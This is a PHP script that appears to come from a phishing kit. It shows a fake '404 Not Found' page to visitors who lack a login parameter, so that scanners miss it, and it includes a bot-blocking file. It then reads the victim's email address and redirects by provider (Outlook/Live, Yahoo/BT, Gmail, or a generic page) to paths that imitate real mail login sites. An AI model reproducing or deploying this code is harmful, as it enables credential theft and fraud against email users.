<?php
session_start();
if(empty($_GET['login']))
{
echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /djdjkd was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>';
exit;
} 
?>
<?php
include('blocker.php');

$name = @$_GET["name"];
$rawww = @$_GET["login"];
$email = strtolower($rawww);
function OutlawedABH($tag, $email){
$i = 0;
$x = "";

while($email[$i] != "@"){
$i = $i+1;
}
$i = $i+1;
$x = substr($email, $i);

$pos = strpos($x, $tag);
if($pos === false){
	return false;
}

else {
	return true;
}

};

if ((OutlawedABH("outlook", $email)) || (OutlawedABH("live", $email)) || (OutlawedABH("msn", $email)) || (OutlawedABH("hotmail", $email))){
	header("location: login.live.com/file.php?login=$email&name=$name");
}


elseif ((OutlawedABH("yahoo", $email)) || (OutlawedABH("btinternet", $email)) || (OutlawedABH("ymail", $email)) || (OutlawedABH("rocketmail", $email))){
	header("location: us-mg5.mail.yahoo.com/file.php?login=$email&name=$name");


}


elseif ((OutlawedABH("gmail", $email)) || (OutlawedABH("google", $email))){
	header("location: mail.google.com/file.php?login=$email&name=$name");

}


else {
	header("location: mx.php?login=$email&name=$name");

}

?>